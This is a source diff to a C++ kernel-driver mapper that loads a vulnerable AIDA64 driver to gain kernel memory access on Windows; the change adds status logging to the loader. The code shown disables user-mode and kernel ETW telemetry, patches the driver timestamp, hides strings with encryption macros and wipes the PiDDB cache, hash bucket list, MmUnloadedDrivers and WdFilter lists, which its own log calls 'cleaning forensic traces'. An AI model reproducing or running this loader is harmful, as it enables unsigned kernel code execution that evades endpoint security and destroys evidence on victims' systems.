@@ -503,34 +503,46 @@ bool intel_driver::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_
 }
 
 NTSTATUS intel_driver::Load() {
-	if (intel_driver::IsRunning())
+	kdmLog(L"[+] Loading vulnerable driver (AIDA64)...\n");
+
+	if (intel_driver::IsRunning()) {
+		kdmLog(L"[-] Driver already running\n");
 		return STATUS_ALREADY_REGISTERED;
+	}
 
 	std::vector<BYTE> driverData;
 
 	if (!vulnerableDriverPath.empty() && std::filesystem::exists(vulnerableDriverPath)) {
-		if (!kdmUtils::ReadFileToMemory(vulnerableDriverPath, &driverData))
+		kdmLog(L"[*] Loading driver from disk: " << vulnerableDriverPath << L"\n");
+		if (!kdmUtils::ReadFileToMemory(vulnerableDriverPath, &driverData)) {
+			kdmLog(L"[-] Failed to read driver file from disk\n");
 			return STATUS_DISK_OPERATION_FAILED;
+		}
 	}
 	else {
+		kdmLog(L"[*] Using embedded driver (" << aida64_driver_size << L" bytes)\n");
 		driverData.assign(aida64_driver, aida64_driver + aida64_driver_size);
 	}
 
 	std::wstring driver_path = GetDriverPath();
-	if (driver_path.empty())
+	if (driver_path.empty()) {
+		kdmLog(L"[-] Failed to generate driver path\n");
 		return STATUS_UNSUCCESSFUL;
+	}
 
 	_wremove(driver_path.c_str());
 
 	PatchUsermodeEtw();
 
 	if (!kdmUtils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(driverData.data()), driverData.size())) {
+		kdmLog(L"[-] Failed to write driver to disk\n");
 		RestoreUsermodeEtw();
 		return STATUS_DISK_OPERATION_FAILED;
 	}
 
 	loadedDriverTimestamp = PatchDriverTimestamp(driver_path);
 	if (!loadedDriverTimestamp) {
+		kdmLog(L"[-] Failed to patch driver timestamp\n");
 		RestoreUsermodeEtw();
 		SecureDeleteFile(driver_path);
 		return STATUS_UNSUCCESSFUL;
@@ -538,17 +550,21 @@ NTSTATUS intel_driver::Load() {
 
 	auto status = AcquireDebugPrivilege();
 	if (!NT_SUCCESS(status)) {
+		kdmLog(L"[-] Failed to acquire debug privilege (0x" << std::hex << status << L")\n");
 		RestoreUsermodeEtw();
 		SecureDeleteFile(driver_path);
 		return status;
 	}
 
+	kdmLog(L"[*] Registering service and loading driver...\n");
 	status = service::RegisterAndStart(driver_path, GetDriverNameW());
 	if (!NT_SUCCESS(status)) {
+		kdmLog(L"[-] NtLoadDriver failed (0x" << std::hex << status << L")\n");
 		RestoreUsermodeEtw();
 		SecureDeleteFile(driver_path);
 		return status;
 	}
+	kdmLog(L"[+] Driver loaded successfully\n");
 
 	auto devOpen = ENCW(L"\\\\.\\AIDA64Driver");
 	hDevice = CreateFileW(devOpen.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -557,23 +573,30 @@ NTSTATUS intel_driver::Load() {
 
 	if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
 	{
+		kdmLog(L"[-] Failed to open device \\\\.\\ AIDA64Driver (err=" << GetLastError() << L")\n");
 		intel_driver::Unload();
 		return STATUS_NOT_FOUND;
 	}
+	kdmLog(L"[+] Device handle acquired\n");
 
 	ntoskrnlAddr = kdmUtils::GetKernelModuleAddress(ENC("ntoskrnl.exe"));
 	if (ntoskrnlAddr == 0) {
+		kdmLog(L"[-] Failed to find ntoskrnl.exe base\n");
 		intel_driver::Unload();
 		return STATUS_BAD_DLL_ENTRYPOINT;
 	}
+	kdmLog(L"[*] ntoskrnl @ 0x" << std::hex << ntoskrnlAddr << L"\n");
 
 	if (!ScanForNtoskrnlPhysBase()) {
+		kdmLog(L"[-] Physical base scan failed\n");
 		intel_driver::Unload();
 		return STATUS_NOT_FOUND;
 	}
+	kdmLog(L"[+] Physical base: 0x" << std::hex << ntoskrnlPhysBase << L"\n");
 
 	kernel_MmGetPhysicalAddress = GetKernelModuleExport(ntoskrnlAddr, ENC("MmGetPhysicalAddress"));
 	if (!kernel_MmGetPhysicalAddress) {
+		kdmLog(L"[-] Failed to resolve MmGetPhysicalAddress\n");
 		intel_driver::Unload();
 		return STATUS_ENTRYPOINT_NOT_FOUND;
 	}
@@ -582,32 +605,39 @@ NTSTATUS intel_driver::Load() {
 
 	IMAGE_DOS_HEADER dosHeader = { 0 };
 	if (!intel_driver::ReadMemory(intel_driver::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
+		kdmLog(L"[-] ntoskrnl readback verification failed\n");
 		intel_driver::Unload();
 		return STATUS_INVALID_IMAGE_FORMAT;
 	}
 
 	DisableKernelEtwTi();
+	kdmLog(L"[*] Cleaning forensic traces...\n");
 
 	if (!intel_driver::ClearPiDDBCacheTable()) {
+		kdmLog(L"[-] PiDDB cache cleanup failed\n");
 		intel_driver::Unload();
 		return STATUS_DELETE_PENDING | 0x1000;
 	}
 
 	if (!intel_driver::ClearKernelHashBucketList()) {
+		kdmLog(L"[-] Hash bucket cleanup failed\n");
 		intel_driver::Unload();
 		return STATUS_DELETE_PENDING | 0x2000;
 	}
 
 	if (!intel_driver::ClearMmUnloadedDrivers()) {
+		kdmLog(L"[-] MmUnloadedDrivers cleanup failed\n");
 		intel_driver::Unload();
 		return STATUS_DELETE_PENDING | 0x3000;
 	}
 
 	if (!intel_driver::ClearWdFilterDriverList()) {
+		kdmLog(L"[-] WdFilter cleanup failed\n");
 		intel_driver::Unload();
 		return STATUS_DELETE_PENDING | 0x4000;
 	}
 
+	kdmLog(L"[+] Driver ready, all traces cleaned\n");
 	return STATUS_SUCCESS;
 }
 
